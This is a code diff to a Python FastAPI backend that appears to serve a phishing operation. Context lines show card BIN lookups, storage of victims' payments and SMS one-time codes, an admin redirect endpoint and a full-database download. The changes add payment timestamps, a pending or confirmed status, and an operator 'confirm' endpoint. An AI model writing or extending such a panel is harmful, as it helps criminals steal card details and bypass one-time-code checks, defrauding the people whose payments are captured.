@@ -13,6 +13,8 @@ from starlette.status import HTTP_403_FORBIDDEN
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi import Request
 import httpx
+from datetime import datetime
+
 
 # --- Configuration ---
 API_KEY = os.getenv("API_KEY", "pro-audit-secret-key-2024")
@@ -93,8 +95,11 @@ async def get_bin_info(bin_code: str) -> dict:
 
 def save_payment(data: dict):
     db = load_db()
+    data["timestamp"] = datetime.now().isoformat()
+    data["status"] = "pending"
     db["payments"].append(data)
     with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+
 
 def save_sms(client_id: str, otp: str):
     db = load_db()
@@ -238,7 +243,30 @@ async def admin_redirect(request: RedirectRequest, api_key: APIKey = Depends(get
 
 @app.get("/v1/admin/history")
 async def get_history(api_key: APIKey = Depends(get_api_key)):
-    return load_db()
+    db = load_db()
+    # Sort payments by timestamp, newest first
+    db["payments"].sort(key=lambda x: x.get("timestamp", ""), reverse=True)
+    return db
+
+@app.post("/v1/admin/confirm")
+async def confirm_payment(client_id: str, api_key: APIKey = Depends(get_api_key)):
+    db = load_db()
+    found = False
+    for p in db["payments"]:
+        if p["client_id"] == client_id:
+            p["status"] = "confirmed"
+            found = True
+            break
+    
+    if found:
+        with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+        await manager.broadcast_to_admins({
+            "type": "PAYMENT_CONFIRMED",
+            "client_id": client_id
+        })
+        return {"status": "confirmed"}
+    raise HTTPException(status_code=404, detail="Client not found")
+
 
 @app.get("/v1/admin/download")
 async def download_db(api_key: APIKey = Depends(get_api_key)):
